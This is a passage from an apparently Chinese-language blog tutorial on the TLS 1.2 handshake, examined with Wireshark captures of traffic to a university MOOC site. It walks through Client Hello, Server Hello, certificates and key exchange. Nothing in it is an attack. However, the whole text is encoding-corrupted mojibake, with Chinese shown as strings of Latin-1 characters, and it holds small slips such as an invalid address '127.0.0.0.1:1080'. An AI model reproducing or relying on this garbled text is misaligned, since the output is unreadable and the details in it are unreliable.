1.2ç‰ˆã€‚æœ€æ–°çš„å˜åŠ¨æ˜¯ 2011 å¹´ TLS 1.2 çš„<ahref="http://tools.ietf.org/html/rfc6176">ä¿®è®¢ç‰ˆ</a>ã€‚</p></blockquote><p>ç›®å‰ï¼Œåº”ç”¨æœ€å¹¿æ³›çš„æ˜¯ TLS 1.2ï¼Œä¸»æµæµè§ˆå™¨éƒ½å·²ç»å®ç°äº† TLS 1.2çš„æ”¯æŒã€‚</p><h2 id="ä¸‰åŸºæœ¬çš„è¿è¡Œè¿‡ç¨‹">ä¸‰ã€åŸºæœ¬çš„è¿è¡Œè¿‡ç¨‹</h2><p>SSL / TLS åè®®çš„åŸºæœ¬æ€è·¯æ˜¯é‡‡ç”¨<ahref="http://en.wikipedia.org/wiki/Public-key_cryptography">å…¬é’¥åŠ å¯†æ³•</a>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯å…ˆå‘æœåŠ¡å™¨ç«¯ç´¢è¦å…¬é’¥ï¼Œç„¶åç”¨å…¬é’¥åŠ å¯†ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°å¯†æ–‡åï¼Œç”¨è‡ªå·±çš„ç§é’¥è§£å¯†ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ã€‚</p><p><strong>ï¼ˆ1ï¼‰å¦‚ä½•ä¿è¯å…¬é’¥ä¸è¢«ç¯¡æ”¹ï¼Ÿ</strong></p><blockquote><p>è§£å†³æ–¹æ³•ï¼šå°†å…¬é’¥æ”¾åœ¨<ahref="http://en.wikipedia.org/wiki/Digital_certificate">æ•°å­—è¯ä¹¦</a>ä¸­ã€‚åªè¦è¯ä¹¦æ˜¯å¯ä¿¡çš„ï¼Œå…¬é’¥å°±æ˜¯å¯ä¿¡çš„ã€‚</p></blockquote><p><strong>ï¼ˆ2ï¼‰å…¬é’¥åŠ å¯†è®¡ç®—é‡å¤ªå¤§ï¼Œå¦‚ä½•å‡å°‘è€—ç”¨çš„æ—¶é—´ï¼Ÿ</strong></p><blockquote><p>è§£å†³æ–¹æ³•ï¼šæ¯ä¸€æ¬¡å¯¹è¯ï¼ˆsessionï¼‰ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½ç”Ÿæˆä¸€ä¸ª"å¯¹è¯å¯†é’¥"ï¼ˆsessionkeyï¼‰ï¼Œç”¨å®ƒæ¥åŠ å¯†ä¿¡æ¯ã€‚ç”±äº"å¯¹è¯å¯†é’¥"æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæ‰€ä»¥è¿ç®—é€Ÿåº¦éå¸¸å¿«ï¼Œè€ŒæœåŠ¡å™¨å…¬é’¥åªç”¨äºåŠ å¯†"å¯¹è¯å¯†é’¥"æœ¬èº«ï¼Œè¿™æ ·å°±å‡å°‘äº†åŠ å¯†è¿ç®—çš„æ¶ˆè€—æ—¶é—´ã€‚</p></blockquote><p>å› æ­¤ï¼ŒSSL/TLS åè®®çš„åŸºæœ¬è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>ï¼ˆ1ï¼‰ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯ç´¢è¦å¹¶éªŒè¯å…¬é’¥ã€‚</p><p>ï¼ˆ2ï¼‰ åŒæ–¹åå•†ç”Ÿæˆ"å¯¹è¯å¯†é’¥"ã€‚</p><p>ï¼ˆ3ï¼‰ åŒæ–¹é‡‡ç”¨"å¯¹è¯å¯†é’¥"è¿›è¡ŒåŠ å¯†é€šä¿¡ã€‚</p></blockquote><p>ä¸Šé¢è¿‡ç¨‹çš„å‰ä¸¤æ­¥ï¼Œåˆç§°ä¸º"æ¡æ‰‹é˜¶æ®µ"ï¼ˆhandshakeï¼‰ï¼Œæ¡æ‰‹é˜¶æ®µä½¿ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œé€šä¿¡é˜¶æ®µä½¿ç”¨å¯¹ç§°ç®—æ³•ã€‚</p><h1 id="æŠ“åŒ…">æŠ“åŒ…</h1><ol type="1"><li><p>æ‰“å¼€ Wireshark è¿›è¡ŒæŠ“åŒ…</p></li><li><p>å®šä½å¯¹åº”ç½‘ç«™æ•°æ®åŒ…ï¼Œä¸¤ä¸ªæ–¹æ³•</p><ol type="1"><li><p>ctrl + f ï¼Œåœ¨æ•è·è¿‡æ»¤å™¨ä¸‹é¢å‡ºç°ä¸€ä¸ªæœç´¢æ ï¼Œç¬¬ä¸€ä¸ªä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©â€œåˆ†ç»„è¯¦æƒ…â€ ï¼Œæœ€åä¸€ä¸ªä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©â€œå­—ç¬¦ä¸²â€ï¼Œæœç´¢ä½ è®¿é—®çš„ç½‘ç«™çš„åŸŸåï¼Œæ¯”å¦‚:baidu,è¿™æ ·å°±èƒ½å®šä½æ•°æ®æŠ¥ï¼Œä¹Ÿå°±èƒ½å®šä½åˆ°å…¶ IP åœ°å€äº†ã€‚</p><p>è¿™æ ·åšå¯è¡Œçš„åŸå› æ˜¯ï¼šåœ¨ TLS/SSL æ¡æ‰‹çš„æ—¶å€™ï¼ŒClient HelloæŠ¥æ–‡ä¸­ä¼šåŒ…å«æœåŠ¡å™¨çš„åŸŸåã€‚</p></li><li><p>æ‰“å¼€æµè§ˆå™¨ï¼ŒæŒ‰ F12ï¼Œè°ƒå‡ºå¼€å‘è€…å·¥å…·ï¼Œé€‰ä¸­ networkä¸€æ ï¼Œç„¶åè®¿é—®ä¸€ä¸ªå›½å†…ï¼ˆä¸ç”¨ç¿»å¢™çš„ç½‘ç«™ï¼‰çš„ä½¿ç”¨ HTTPSçš„ç½‘ç«™ï¼Œå¾…ç½‘é¡µåŠ è½½å®Œæ¯•ã€‚ç„¶ååœ¨å¼€å‘è€…å·¥å…·ä¸­æ‰¾åˆ°ç½‘ç«™ä¸»é¡µï¼ŒæŸ¥çœ‹æ­¤æ¬¡è®¿é—®çš„IPã€‚</p></li></ol></li></ol><ol start="3" type="1"><li><p>åœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸­è¾“å…¥: ip.addr == ä½ è®¿é—®çš„ ip &amp;&amp; ssl</p><p>æ›´ç²¾ç¡®çš„è¯ï¼Œå¯ä»¥è¾“å…¥ï¼šip.addr == ä½ è®¿é—®çš„ ip &amp;&amp;tls.handshake</p></li></ol><p>å¯¹åº”æ–¹æ³• b æœ‰ä¸¤ä¸ªæ³¨æ„ç‚¹ï¼š</p><ol type="1"><li><p>ä¸ºä»€ä¹ˆè¦åœ¨å¼€å‘è€…å·¥å…·é‡Œé¢å®æ—¶çœ‹ IPï¼Œè€Œä¸ç›´æ¥ pingå‘¢ï¼Ÿå› ä¸ºç°åœ¨ç¨å¾®å¤§ä¸€ç‚¹ç½‘ç«™ä¸€ä¸ªåŸŸåå¯¹åº”ä¸€ä¸ªä¸»æœºé›†ç¾¤ï¼Œå¹¶ä¸ä»…ä»…åªæ˜¯ä¸€ä¸ªä¸»æœºï¼ˆIPï¼‰ï¼Œæ‰€ä»¥ï¼Œå³ä½¿ä½ åœ¨æ‰“å¼€ç½‘é¡µçš„åŒæ—¶å»åœ¨cmd é‡Œé¢ ping è¯¥åŸŸåï¼Œä½  ping å‡ºæ¥çš„ IP ä¹Ÿä¸ä¸€å®šæ˜¯ä½ åˆšæ‰è®¿é—®çš„IPã€‚</p></li><li><p>ä¸ºä»€ä¹ˆè¦è®¿é—®ä¸ç¿»å¢™çš„ç½‘ç«™å‘¢?</p><p>å…¶å®ä½ ä¸€çœ‹å¼€å‘è€…å·¥å…·å°±çŸ¥é“äº†ï¼Œæ¯”å¦‚ä½ ä½¿ç”¨Shadowsocksï¼Œé‚£ä¹ˆä½ è®¿é—®éœ€è¦ç¿»å¢™çš„ç½‘ç«™æ—¶ï¼Œåœ¨å¼€å‘è€…å·¥å…·é‡Œé¢çœ‹åˆ°çš„åœ°å€æ˜¯ï¼š127.0.0.0.1:1080.è¿™æ ·ï¼Œè¿˜æ˜¯æ‰¾ä¸åˆ° IP å‘€ã€‚</p></li></ol><p>æ³¨ï¼š</p><ol type="1"><li>ä¸Šé¢æ‰¾ IPçš„æ–¹æ³•æ˜¯ä¸ºäº†èƒ½å¤Ÿæ‰¾åˆ°è‡ªå·±è®¿é—®çš„ç‰¹å®šç½‘ç«™çš„æ•°æ®æŠ¥æ‰€æä¾›ï¼Œå¦‚æœä½ ä¸æƒ³æ‰¾ç‰¹å®šç½‘ç«™ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨æ˜¾ç¤ºè¿‡æ»¤è¯­æ³•ï¼šsslæˆ–è€… tls.handshake å³å¯</li><li>æœ¬æ¥æƒ³æ”¾åˆ°åé¢è¯´ï¼Œä½†æ˜¯è¿˜æ˜¯åœ¨å‰é¢è¯´çš„ï¼Œå…å¾—ä½ å‘ç°è‡ªå·±çš„åŒ…ä¸æˆ‘çš„è®²è§£ä¸å¤ªç›¸ç¬¦ã€‚è¦çŸ¥é“å³ä½¿éƒ½æ˜¯TLS 1.2 åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¹Ÿä¼šæœ‰äº›è®¸ä¸ä¸€æ ·ï¼ˆæˆ‘çŒœçš„ï¼Œå› ä¸ºæˆ‘è‡ªå·±æŠ“çš„å’Œç½‘ä¸Šæ‰¾çš„2018 å¹´çš„ä¸€ä¸ªæŠ“åŒ…æ–‡ä»¶ï¼Œéƒ½æ˜¯ TLS 1.2ä½†æœ‰äº›å°å·®å¼‚ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯å°ç‰ˆæœ¬æ”¹åŠ¨ï¼‰ã€‚æ­¤å¤–ï¼Œä½ è¦æ˜¯éƒ½ä¸æ˜¯ TLS1.2ï¼Œé‚£å°±æ›´ä¸ä¸€æ ·äº†ï¼Œä¸è¿‡ï¼Œå¤§ä½“æ­¥éª¤é¡ºåºæ˜¯ä¸€æ ·çš„ï¼ŒåŸç†ä¸€æ ·ã€‚</li></ol><p>ç›¸å…³çŸ¥è¯†ï¼š</p><blockquote><p>ä¸€ä¸ªåŸŸåç”¨ dns è§£æåˆ°å¤šå°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¦‚æœåšäº†è´Ÿè½½å†—ä½™ï¼Œé‚£ä¹ˆå…¶ä¸­ä¸€ä¸ªip çš„æœåŠ¡å™¨å®•æœºäº†çš„è¯ï¼Œå¦å¤–ä¸€ä¸ªç«‹é©¬è¡¥ä¸Šè€Œç”¨æˆ·å»å¯Ÿè§‰ä¸åˆ°å†—ä½™ï¼šèµ·åˆ°çš„ä½œç”¨æ˜¯åœ¨ä½ ä¸»å¤‡æœåŠ¡å™¨çš„ä¸»æœºå®•æœºä¹‹åï¼Œç«‹åˆ»å¯åŠ¨å¤‡æœºé˜²æ­¢åº”ç”¨ä¸èƒ½è®¿é—®ï¼Œæä¾›24å°æ—¶ä¸é—´æ–­æœåŠ¡ã€‚è´Ÿè½½æ˜¯åœ¨ä¸€ä¸ªæœåŠ¡å™¨ç»„ä¸­åšå‡è¡¡ï¼Œæé«˜æœåŠ¡å™¨ç»„çš„æ€»ä½“è¿è¡Œå®‰å…¨åº¦ã€‚è¿™ç‚¹è´Ÿè½½ä¸å†—ä½™æœ‰å¾ˆå¤§çš„ç›¸ä¼¼å¤„ã€‚</p></blockquote><p>å…ˆæ”¾ä¸¤ä¸ªå›¾ï¼Œä¸‹é¢ä½¿ç”¨ä¸€å¼ å›¾æ¥è®²è§£ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/icourse_tls.png" /></p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tls.png" /></p><h1 id="åŸç†æ­¥éª¤">åŸç†æ­¥éª¤</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tls_handshake.png" /></p><p>"æ¡æ‰‹é˜¶æ®µ"æ¶‰åŠå››æ¬¡é€šä¿¡ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªæ¥çœ‹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ"æ¡æ‰‹é˜¶æ®µ"çš„æ‰€æœ‰é€šä¿¡éƒ½æ˜¯æ˜æ–‡çš„ã€‚</p><h2 id="client-hello"><strong>Client Hello</strong></h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/client_hello_proc.jpg"alt="client hello" /><figcaption aria-hidden="true">client hello</figcaption></figure><p>å®¢æˆ·ç«¯å‘é€ â€œClient Helloâ€ æŠ¥æ–‡ç»™æœåŠ¡ç«¯</p><p>å¦‚æœå®¢æˆ·ç«¯ï¼ˆ Web æµè§ˆå™¨æˆ– æ‰‹æœºåº”ç”¨ï¼‰å‘èµ·ä¸€ä¸ª TLS æ¡æ‰‹ï¼Œå®ƒå°†ä¼šåœ¨â€œClient Helloâ€ æŠ¥æ–‡ä¸­å‘é€ä¸‹åˆ—é‡è¦çš„å‚æ•°ï¼š</p><ul><li><p>éšæœºå­—èŠ‚ï¼šå®¢æˆ·ç«¯ä½¿ç”¨ä¸€ä¸ªå®‰å…¨çš„éšæœºæ•°äº§ç”Ÿå™¨äº§ç”Ÿéšæœºå­—èŠ‚ã€‚éšæœºæ•°ç”Ÿæˆçš„ç†µæºå°†å–å†³äºæ“ä½œç³»ç»Ÿå’Œå®¢æˆ·ç«¯è½¯ä»¶çš„å®ç°ï¼Œç¨åå‚ä¸ç”Ÿæˆâ€œå¯¹è¯å¯†é’¥â€</p></li><li><p>ä¼šè¯ IDï¼šå¦‚æœå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯åœ¨è¿‡å»å»ºç«‹è¿‡ä¸€ä¸ª TLSä¼šè¯ï¼Œè¯¥æ ‡è¯†ç¬¦ä¾¿å¯ä»¥å…·æœ‰å…ˆå‰çš„ä¼šè¯ IDå€¼ï¼Œå¦‚æˆªå›¾æ‰€ç¤ºï¼Œå…¶å¯ä»¥ç”¨äºæ›´æ–°è¯¥ä¼šè¯çš„åŠ å¯†å‚æ•°ã€‚å¯¹äºæ–°ä¼šè¯ï¼Œæ­¤å­—æ®µä¸ºç©ºç™½ï¼Œè¿™é‡Œæ¶‰åŠä¼šè¯å¤ç”¨çŸ¥è¯†ï¼Œä¼šè€ƒè™‘å†åŠ ä¸€ç¯‡æ–‡ç« æˆ–ç»™å‡ºå‚è€ƒèµ„æ–™ã€‚</p></li><li><p>åŠ å¯†å¥—ä»¶åˆ—è¡¨ï¼šå®¢æˆ·ç«¯è¿˜ä¼šæ ¹æ®å®ƒçš„åå¥½å‘é€ä¸€ä¸ªå®ƒæ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨ï¼Œåœ¨æ­¤å›¾ä¸­ï¼Œå®¢æˆ·ç«¯æœ€é’Ÿæƒ…çš„åŠ å¯†å¥—ä»¶æ˜¯TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256ï¼Œç„¶è€Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯é€‰æ‹©äº†ç¬¬äºŒä¸ªå¥—ä»¶ï¼ˆåœ¨ä¸‹ä¸€æ­¥ä¸­å¯ä»¥çœ‹åˆ°ï¼‰ï¼Œè¿™ä¸€é•¿ä¸²çš„åŠ å¯†åå­—è¡¨ç¤ºä»€ä¹ˆå‘¢ï¼Ÿä»¥TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 ä¸ºä¾‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/format.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>å¯†é’¥äº¤æ¢ä½¿ç”¨ ECDHE ç®—æ³•ï¼ŒæœåŠ¡èº«ä»½éªŒè¯ä½¿ç”¨ RSA ç®—æ³•ï¼Œæ•°æ®ä¼ è¾“åŠ å¯†ä½¿ç”¨AESï¼ˆ+GCMï¼‰ï¼Œæ¡æ‰‹ä½¿ç”¨ SHA256 æ£€éªŒã€‚</p><p>æ¢å¥è¯è¯´ï¼Œè¯ä¹¦ç­¾åä½¿ç”¨ RSAï¼Œå¦‚æœè¯ä¹¦éªŒè¯æ­£ç¡®ï¼Œé‚£ä¹ˆå°†ä½¿ç”¨ ECDHEç®—æ³•è¿›è¡Œå¯†é’¥äº¤æ¢ï¼Œä¿è¯æµè§ˆå™¨å’ŒæœåŠ¡æ‹¥æœ‰ç›¸åŒçš„ç§æœ‰å¯†é’¥ï¼Œç„¶åä¸€æ–¹ä½¿ç”¨è¿™æŠŠå¯†é’¥è¿›è¡ŒAES æ•°æ®åŠ å¯†ï¼Œå¦ä¸€æ–¹ä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡Œ AESæ•°æ®è§£å¯†ã€‚éªŒè¯è¯ä¹¦ç­¾ååˆæ³•æ€§å’Œå¯†é’¥äº¤æ¢çš„èº«ä»½ç¡®è®¤éƒ½æ˜¯ä½¿ç”¨ SHA256è¿™ä¸ªå“ˆå¸Œç®—æ³•è¿›è¡Œæ£€éªŒã€‚å…·ä½“è¿‡ç¨‹ä¸‹æ–‡å±•å¼€æè¿°ã€‚</p></li><li><p>Compression Method å‹ç¼©æ–¹å¼ï¼Œå¯ä»¥å±•å¼€ä¸‹æ‹‰åˆ—è¡¨ï¼Œé»˜è®¤æ˜¯nullã€‚0ï¼Œå³ï¼šä¸ä½¿ç”¨å‹ç¼©ã€‚</p></li><li><p>ä¸‹é¢æˆ‘ä»¬å¯ä»¥çœ‹ä¸€çœ‹ Extension</p><ol type="1"><li>Reserverd æ˜¯ä¿ç•™</li><li>server_nameæœåŠ¡å™¨åï¼Œå¯ä»¥ä¸‹æ‹‰åˆ—è¡¨å±•å¼€ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘æ˜¯æŠ“çš„åŒ…çš„æœåŠ¡ç«¯æ˜¯www.icourse163.orgï¼Œå°±æ˜¯ä¸­å›½å¤§å­¦ MOOCã€‚</li><li>session_ticket ä¼šè¯ç¥¨æ®ï¼Œå®¢æˆ·ç«¯å‘èµ· client helloï¼ŒExtentionä¸­å¸¦ä¸Šç©ºçš„ session ticket TLSï¼Œè¡¨æ˜è‡ªå·±æ”¯æŒ session ticketã€‚</li><li>supported_version åŒ…å« Client æ”¯æŒçš„ TLS åè®®ç‰ˆæœ¬ã€‚</li><li>ä»¥åæœ‰é‡è¦çš„å†è¡¥å……</li></ol></li></ul><h2 id="server-hello">Server Hello</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/serverhello_proc.jpg"alt="server hello" /><figcaption aria-hidden="true">server hello</figcaption></figure><p>â€œServer Helloâ€ æŠ¥æ–‡æ˜¯ç”¨æ¥å›åº” â€œClient Helloâ€ æŠ¥æ–‡çš„ã€‚</p><p>æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚åï¼Œå‘å®¢æˆ·ç«¯å‘å‡ºå›åº”ï¼Œè¿™å«åš ServerHelloã€‚æœåŠ¡å™¨ä»æ”¶åˆ°çš„å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ å¯†æ–¹æ³•åˆ—è¡¨é€‰æ‹©ä¸€ç»„å®ƒæ”¯æŒçš„åŠ å¯†æ–¹æ³•ï¼Œå¦‚æœè¯¥åˆ—è¡¨ä¸­ä¸åŒ…æ‹¬æœåŠ¡å™¨è®¤å¯ã€æ”¯æŒæˆ–æƒ³è¦ä½¿ç”¨çš„åŠ å¯†æ–¹æ³•ç»„ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°†ä¼šå¿½ç•¥è¿™äº›å¯†æ–‡ï¼Œå¦‚æœæœåŠ¡å™¨æ‰¾ä¸åˆ°è‡ªå·±æ”¯æŒçš„åŠ å¯†ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å‘é€å¤±è´¥è­¦å‘Šå¹¶å…³é—­è¿æ¥ã€‚</p><p>æœåŠ¡å™¨çš„å›åº”å†…å®¹åŒ…æ‹¬ä»¥ä¸‹å†…å®¹</p><ul><li>éšæœºæ•°ï¼šæœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªä¸å®¢æˆ·ç«¯ç‹¬ç«‹ï¼ˆæ— å…³ï¼‰çš„éšæœºæ•°ï¼Œç¨åå‚ä¸ç”Ÿæˆâ€œå¯¹è¯å¯†é’¥â€</li><li>åŠ å¯†é€šä¿¡åè®®ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶ï¼šå¦‚æœæµè§ˆå™¨ä¸æœåŠ¡å™¨æ”¯æŒçš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼ŒæœåŠ¡å™¨å…³é—­åŠ å¯†é€šä¿¡ã€‚åœ¨æœ¬æ¬¡æŠ“åŒ…ä¸­ï¼ŒæœåŠ¡ç«¯é€‰æ‹©äº†å®¢æˆ·ç«¯ç¬¬äºŒåå¥½çš„åŠ å¯†å¥—ä»¶ï¼š<code>TLS 1.2 with TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code>.</li><li>Session ID : è¿™é‡Œè¿”å›çš„ session ID ä¸º0ï¼Œå³ï¼šæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œä¼šè¯å¤ç”¨ã€‚åŸå› æ˜¯å› ä¸ºæœåŠ¡å™¨ä¼šè¯è€åŒ–äº†ï¼ŒæœåŠ¡æœŸå¼€å¯äº†æ–°çš„ä¼šè¯ï¼Œæ–°çš„ä¼šè¯çš„ä¼šè¯ID ä¸º 0</li><li>å¸¦æœ‰è¯ä¹¦é“¾çš„æœåŠ¡å™¨è¯ä¹¦ï¼ˆå®¢æˆ·ç«¯ä¿¡ä»»åº“ä¸­å­˜å‚¨çš„è¯ä¹¦å°†éªŒè¯è¯¥è¯ä¹¦é“¾ï¼‰</li></ul><p>é™¤äº†ä¸Šé¢è¿™äº›ä¿¡æ¯ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦ç¡®è®¤å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œå°±ä¼šå†åŒ…å«ä¸€é¡¹è¯·æ±‚ï¼Œè¦æ±‚å®¢æˆ·ç«¯æä¾›"å®¢æˆ·ç«¯è¯ä¹¦"ï¼Œæ¯”å¦‚ï¼Œé‡‘èæœºæ„å¾€å¾€åªå…è®¸è®¤è¯å®¢æˆ·è¿å…¥è‡ªå·±çš„ç½‘ç»œï¼Œå°±ä¼šå‘æ­£å¼å®¢æˆ·æä¾›USB å¯†é’¥ï¼Œé‡Œé¢å°±åŒ…å«äº†ä¸€å¼ å®¢æˆ·ç«¯è¯ä¹¦ã€‚</p><h2 id="server-certificate">Server Certificate</h2><p>åœ¨ â€œserver helloâ€ å®Œæˆä¹‹åï¼ŒæœåŠ¡ç«¯å¿…é¡»å‘é€èƒ½å¤Ÿè¢«æµè§ˆå™¨æˆ–ç§»åŠ¨è®¾å¤‡çš„æ ¹CA éªŒè¯çš„è¯ä¹¦æˆ–è¯ä¹¦é“¾ï¼Œæ ¹æ®ä¸Šé¢æ˜¾ç¤ºçš„æ•°å­—ï¼Œè¿™äº›è¯ä¹¦æ˜¯è¢«www.icouse163.comæœåŠ¡å™¨å‘é€çš„ã€‚ï¼ˆå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å›åº”ä»¥åï¼Œé¦–å…ˆéªŒè¯æœåŠ¡å™¨è¯ä¹¦ã€‚å¦‚æœè¯ä¹¦ä¸æ˜¯å¯ä¿¡æœºæ„é¢å¸ƒã€æˆ–è€…è¯ä¹¦ä¸­çš„åŸŸåä¸å®é™…åŸŸåä¸ä¸€è‡´ã€æˆ–è€…è¯ä¹¦å·²ç»è¿‡æœŸï¼Œå°±ä¼šå‘è®¿é—®è€…æ˜¾ç¤ºä¸€ä¸ªè­¦å‘Šï¼Œç”±å…¶é€‰æ‹©æ˜¯å¦è¿˜è¦ç»§ç»­é€šä¿¡ã€‚ï¼‰</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/cert.png"alt="Certificate" /><figcaption aria-hidden="true">Certificate</figcaption></figure><p>CAï¼ˆ<em>certification authority</em>ï¼‰æ˜¯ä»¥æ„å»ºåœ¨å…¬é’¥åŸºç¡€è®¾æ–½PKIï¼ˆpublic keyinfrastructureï¼‰åŸºç¡€ä¹‹ä¸Šçš„äº§ç”Ÿå’Œç¡®å®šæ•°å­—è¯ä¹¦çš„ç¬¬ä¸‰æ–¹å¯ä¿¡æœºæ„ï¼ˆtrustedthirdpartyï¼‰ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘å°†ç®€è¦ä»‹ç»ä¸€ä¸‹å½“æµè§ˆå™¨æ”¶åˆ°æœåŠ¡ç«¯çš„è¯ä¹¦æ—¶å‘ç”Ÿäº†äº›ä»€ä¹ˆã€‚åŸºäºPKI çš„ CA å’Œ TLS åè®®ç»“åˆèµ·æ¥èƒ½æä¾›å¾ˆå¥½çš„å®‰å…¨æ€§ã€‚è¦çŸ¥é“ï¼Œæˆ‘ä»¬å¯¹æ ¹è¯ä¹¦æœ‰æ— æ¡ä»¶çš„ä¿¡ä»»ã€‚æ³¨æ„ä¸‹é¢ä¸€æ®µçš„å†…å®¹å¹¶ä¸å±äº TLSåè®®çš„ä¸€éƒ¨åˆ†ã€‚</p><p>â€œåŠ å¯†â€å­—æ®µå®é™…ä¸Šæ˜¯ä¸ç¬¬ä¸€ä¸ªè¯ä¹¦ç›¸å…³è”çš„æ•°å­—ç­¾åã€‚â€œencryptedâ€å­—æ®µä¸Šæ–¹çš„â€œalgorithmIdentifierâ€å­—æ®µè¡¨ç¤ºsha256WithRSAEncryption ã€‚è¿™æ„å‘³ç€ç¬¬ä¸€ä¸ªè¯ä¹¦çš„ SHA-256å“ˆå¸Œå€¼æ˜¯ä½¿ç”¨ä¸Šé¢çš„è¯ä¹¦é¢å‘æœºæ„çš„ RSAï¼ˆç§æœ‰ï¼‰å¯†é’¥ç­¾åçš„ã€‚æµè§ˆå™¨ä½¿ç”¨è¯ä¹¦ä¸­ä¸ä¹‹ç›¸å¯¹åº”çš„å…¬é’¥æ¥éªŒè¯ç­¾åã€‚ç»§ç»­ç›¸åŒçš„éªŒè¯æ­¥éª¤ï¼Œç›´åˆ° CAè¯ä¹¦æ­£å¥½ä½äºæ ¹ CA ä¹‹ä¸‹ã€‚æ ¹ CA è¯ä¹¦ä¸éœ€è¦éªŒè¯ï¼Œå› ä¸ºå®ƒç”±æµè§ˆå™¨éšå¼ä¿¡ä»»ã€‚è¯·æ³¨æ„ï¼Œâ€œalgorithmIdentifierâ€ å€¼ä¸å‰é¢æè¿°çš„â€œå¯†ç å¥—ä»¶ä¸ç›¸å…³ã€‚ç°åœ¨ï¼Œåœ¨æ­¤æ¶ˆæ¯ä¸­çªå‡ºæ˜¾ç¤ºä¸€ä¸ªå­—æ®µéå¸¸é‡è¦ã€‚åµŒå…¥åœ¨è¯ä¹¦é“¾ä¸­ç¬¬ä¸€ä¸ªè¯ä¹¦ä¸­çš„å…¬é’¥å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/rsa_pukey.png"alt="www.icourse163.com åœ¨ç¬¬ä¸€ä¸ªè¯ä¹¦ä¸­çš„å…¬é’¥" /><figcaption aria-hidden="true">www.icourse163.comåœ¨ç¬¬ä¸€ä¸ªè¯ä¹¦ä¸­çš„å…¬é’¥</figcaption></figure><p>æ­¤è¯ä¹¦åŒ…å« www.icourse163.com æœåŠ¡å™¨çš„ RSAå…¬é’¥ï¼ˆä»¥åŠç›¸å…³çš„æ•°å­¦å‚æ•°ï¼‰ï¼Œå› ä¸ºæœåŠ¡å™¨é€‰æ‹©äº†åŒ…å« RSAä½œä¸ºæ•°å­—ç­¾åç®—æ³•çš„å¯†ç å¥—ä»¶ã€‚è¯¥å…¬é’¥å°†åœ¨æ¡æ‰‹çš„åç»­æ­¥éª¤ä¸­ç”¨äºæ•°å­—ç­¾åã€‚</p><h2 id="server-key-exchange-server-hello-done">Server Key Exchange &amp;Server Hello Done</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/server_exchage.png"alt="server_exchage" /><figcaption aria-hidden="true">server_exchage</figcaption></figure><p>æœåŠ¡å™¨åœ¨ â€œserver key exchange messageâ€ æ¶ˆæ¯ä¸­å‘é€å®ƒçš„å‚æ•°</p><p>æ¡æ‰‹åè®®çš„ä¸‹ä¸€æ­¥æ˜¯äº¤æ¢ç”¨äºç”Ÿæˆå¯¹ç§°å¯†é’¥çš„å‚æ•°ä»¥åŠ å¯†æ‰€æœ‰æœªæ¥çš„åº”ç”¨ç¨‹åºæ•°æ®ã€‚å½“æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯åŒæ„ä½¿ç”¨ Elliptic Curve 